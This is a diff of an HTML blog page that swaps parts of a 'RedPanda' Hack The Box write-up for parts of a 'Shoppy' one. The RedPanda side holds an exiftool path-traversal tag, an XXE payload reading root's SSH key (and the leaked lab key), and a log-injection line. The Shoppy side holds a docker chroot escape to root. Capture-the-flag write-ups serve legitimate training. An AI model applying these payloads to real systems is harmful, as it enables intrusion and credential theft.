-</span></span><span class="line"><span class="cl">    <span class="n">xmlOutput</span><span class="o">.</span><span class="na">output</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">writer</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now, We are going to make our exploit that includes the <strong>.jpg</strong> and <strong>.xml</strong> files.</p>
-<p>Let&rsquo;s begin with the <strong>.jpg</strong> file:</p>
-<ol>
-<li>I have got a random image and removed all its metadata using <strong>exiftool</strong>.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ exiftool -all<span class="o">=</span> jpg_exploit.jpg 
-</span></span><span class="line"><span class="cl">Warning: ICC_Profile deleted. Image colors may be affected - jpg_exploit.jpg
-</span></span><span class="line"><span class="cl">    <span class="m">1</span> image files updated                                                                           
-</span></span><span class="line"><span class="cl">└─$ exiftool jpg_exploit.jpg      
-</span></span><span class="line"><span class="cl">ExifTool Version Number         : 12.49
-</span></span><span class="line"><span class="cl">File Name                       : jpg_exploit.jpg
-</span></span><span class="line"><span class="cl">Directory                       : .
-</span></span><span class="line"><span class="cl">File Size                       : 4.9 MB
-</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2022:11:16 10:31:34-05:00
-</span></span><span class="line"><span class="cl">File Access Date/Time           : 2022:11:16 10:31:34-05:00
-</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2022:11:16 10:31:34-05:00
-</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
-</span></span><span class="line"><span class="cl">File Type                       : JPEG
-</span></span><span class="line"><span class="cl">File Type Extension             : jpg
-</span></span><span class="line"><span class="cl">MIME Type                       : image/jpeg
-</span></span><span class="line"><span class="cl">Image Width                     : <span class="m">6720</span>
-</span></span><span class="line"><span class="cl">Image Height                    : <span class="m">4480</span>
-</span></span><span class="line"><span class="cl">Encoding Process                : Progressive DCT, Huffman coding
-</span></span><span class="line"><span class="cl">Bits Per Sample                 : <span class="m">8</span>
-</span></span><span class="line"><span class="cl">Color Components                : <span class="m">3</span>
-</span></span><span class="line"><span class="cl">Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span class="o">(</span><span class="m">2</span> 2<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Image Size                      : 6720x4480
-</span></span><span class="line"><span class="cl">Megapixels                      : 30.1
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="2">
-<li>Now we add the Artist tag with a path of directory that has a WRITE access.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ exiftool -Artist<span class="o">=</span><span class="s2">&#34;../tmp/pwn&#34;</span> jpg_exploit.jpg 
-</span></span><span class="line"><span class="cl">    <span class="m">1</span> image files updated     
-</span></span><span class="line"><span class="cl">└─$ exiftool jpg_exploit.jpg                     
-</span></span><span class="line"><span class="cl">ExifTool Version Number         : 12.49
-</span></span><span class="line"><span class="cl">File Name                       : jpg_exploit.jpg
-</span></span><span class="line"><span class="cl">Directory                       : .
-</span></span><span class="line"><span class="cl">File Size                       : 4.9 MB
-</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2022:11:16 10:32:33-05:00
-</span></span><span class="line"><span class="cl">File Access Date/Time           : 2022:11:16 10:32:33-05:00
-</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2022:11:16 10:32:33-05:00
-</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
-</span></span><span class="line"><span class="cl">File Type                       : JPEG
-</span></span><span class="line"><span class="cl">File Type Extension             : jpg
-</span></span><span class="line"><span class="cl">MIME Type                       : image/jpeg
-</span></span><span class="line"><span class="cl">Exif Byte Order                 : Big-endian <span class="o">(</span>Motorola, MM<span class="o">)</span>
-</span></span><span class="line"><span class="cl">X Resolution                    : <span class="m">72</span>
-</span></span><span class="line"><span class="cl">Y Resolution                    : <span class="m">72</span>
-</span></span><span class="line"><span class="cl">Resolution Unit                 : inches
-</span></span><span class="line"><span class="cl">Artist                          : ../tmp/pwn
-</span></span><span class="line"><span class="cl">Y Cb Cr Positioning             : Centered
-</span></span><span class="line"><span class="cl">Image Width                     : <span class="m">6720</span>
-</span></span><span class="line"><span class="cl">Image Height                    : <span class="m">4480</span>
-</span></span><span class="line"><span class="cl">Encoding Process                : Progressive DCT, Huffman coding
-</span></span><span class="line"><span class="cl">Bits Per Sample                 : <span class="m">8</span>
-</span></span><span class="line"><span class="cl">Color Components                : <span class="m">3</span>
-</span></span><span class="line"><span class="cl">Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span class="o">(</span><span class="m">2</span> 2<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Image Size                      : 6720x4480
-</span></span><span class="line"><span class="cl">Megapixels                      : 30.1
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="3">
-<li>Finally, Send the <strong>.jpg</strong> file to victim&rsquo;s tmp directory.</li>
-</ol>
-<p>Now, We go for the <strong>.xml</strong> file:</p>
-<ol>
-<li>We construct the <strong>.xml</strong> as the ones the already exist to avoid any confliction in the structure.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;credits&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;author&gt;</span>woodenk<span class="nt">&lt;/author&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/img/greg.jpg<span class="nt">&lt;/uri&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>1<span class="nt">&lt;/views&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/img/hungy.jpg<span class="nt">&lt;/uri&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/img/smooch.jpg<span class="nt">&lt;/uri&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/img/smiley.jpg<span class="nt">&lt;/uri&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;totalviews&gt;</span>1<span class="nt">&lt;/totalviews&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/credits&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="2">
-<li>We create our <strong>pwn_creds.xml</strong> and we will use <strong>XML Entity Expansion (XXE)</strong> to inject a payload that can print the private ssh credientials of root.</li>
-</ol>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1290,93 +698,22 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
-</span></span></span><span class="line"><span class="cl"><span class="cp">   &lt;!ELEMENT foo ANY &gt;</span>
-</span></span><span class="line"><span class="cl">   <span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///root/.ssh/id_rsa&#34; &gt;</span>]&gt;
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;credits&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;author&gt;</span>pwn<span class="nt">&lt;/author&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uri&gt;</span>/../../../../../../tmp/jpg_exploit.jpg<span class="nt">&lt;/uri&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;views&gt;</span>1<span class="nt">&lt;/views&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/image&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;totalviews&gt;</span>1<span class="nt">&lt;/totalviews&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/credits&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh deploy@shoppy.htb 
+</span></span><span class="line"><span class="cl">deploy@shoppy.htb password: 
+</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 06:04:57 <span class="m">2022</span> from 10.10.14.38
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ol start="3">
-<li>Then, Send the below string to <strong>/opt/panda_search/redpanda.log</strong>.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;222||a||a||/../../../../../../tmp/jpg_exploit.jpg&#34;</span> &gt; /opt/panda_search/redpanda.log
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now, It is time to get the SSH key of the root:</p>
-<ol>
-<li>View the <strong>/tmp/jpg_creds.xml</strong> to see the root&rsquo;s private SSH key in it.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">woodenk@redpanda:/tmp$ cat /tmp/jpg_creds.xml 
-</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
-</span></span><span class="line"><span class="cl">&lt;!DOCTYPE foo&gt;
-</span></span><span class="line"><span class="cl">&lt;credits&gt;
-</span></span><span class="line"><span class="cl">  &lt;author&gt;pwn&lt;/author&gt;
-</span></span><span class="line"><span class="cl">  &lt;image&gt;
-</span></span><span class="line"><span class="cl">    &lt;uri&gt;/../../../../../../tmp/jpg_exploit.jpg&lt;/uri&gt;
-</span></span><span class="line"><span class="cl">    &lt;views&gt;1&lt;/views&gt;
-</span></span><span class="line"><span class="cl">    &lt;foo&gt;-----BEGIN OPENSSH PRIVATE KEY-----
-</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-</span></span><span class="line"><span class="cl">QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
-</span></span><span class="line"><span class="cl">ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
-</span></span><span class="line"><span class="cl">AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
-</span></span><span class="line"><span class="cl"><span class="nv">RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE</span><span class="o">=</span>
-</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----&lt;/foo&gt;
-</span></span><span class="line"><span class="cl">  &lt;/image&gt;
-</span></span><span class="line"><span class="cl">  &lt;totalviews&gt;1&lt;/totalviews&gt;
-</span></span><span class="line"><span class="cl">&lt;/credits&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="2">
-<li>Store it in any text file and change its permissions.</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ chmod <span class="m">600</span> ssh_key.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="3">
-<li>Connect to the victim&rsquo;s machine using SSH with root privilages.</li>
-</ol>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1385,15 +722,15 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh -i ssh_key.txt root@10.10.11.170
-</span></span><span class="line"><span class="cl">root@redpanda:~# id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span><span class="line"><span class="cl">root@redpanda:~# cat root.txt 
-</span></span><span class="line"><span class="cl">0c9a981760e9e26XXXXXXXXXXXXXX
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>daemon<span class="o">)</span>,2<span class="o">(</span>bin<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>uucp<span class="o">)</span>,11,20<span class="o">(</span>dialout<span class="o">)</span>,26<span class="o">(</span>tape<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ cat root.txt
+</span></span><span class="line"><span class="cl">e65b2ace8ff78062XXXXXXXXXXXX
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><em>Pwned</em>
-<img src="/post/RedPanda_HTB/imgs/RedPanda/15.png"
+<img src="/post/Shoppy_HTB/imgs/Shoppy/1.png"
 	
 	
 	
@@ -1596,32 +933,27 @@ slug = &quot;&quot;</p>
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#scanning">Scanning</a>
-      <ol>
-        <li><a href="#nmap">Nmap</a></li>
-      </ol>
-    </li>
+    <li><a href="#scanning">Scanning</a></li>
     <li><a href="#enumeration">Enumeration</a>
       <ol>
+        <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
         <li><a href="#directory-enumeration">Directory Enumeration</a></li>
-        <li><a href="#web-enumeration">Web Enumeration</a></li>
       </ol>
     </li>
     <li><a href="#exploitation">Exploitation</a>
       <ol>
-        <li><a href="#server-side-template-injection-ssti">Server Side Template Injection (SSTI)</a>
+        <li><a href="#nosql-injection">NoSQL Injection</a></li>
+        <li><a href="#hash-decryption">Hash Decryption</a></li>
+        <li><a href="#ssh-reverse-shell">SSH Reverse shell</a>
           <ol>
-            <li><a href="#detect">Detect</a></li>
-            <li><a href="#identify">Identify</a></li>
-            <li><a href="#exploit">Exploit</a></li>
+            <li><a href="#usertxt">User.txt</a></li>
           </ol>
         </li>
       </ol>
     </li>
-    <li><a href="#post-exploitation">Post-Exploitation</a>
+    <li><a href="#privilage-escalation">Privilage Escalation</a>
       <ol>
-        <li><a href="#linpeassh">linpeas.sh</a></li>
-        <li><a href="#id">id</a></li>
+        <li><a href="#sudo--l">Sudo -l</a></li>
       </ol>
     </li>
   </ol>
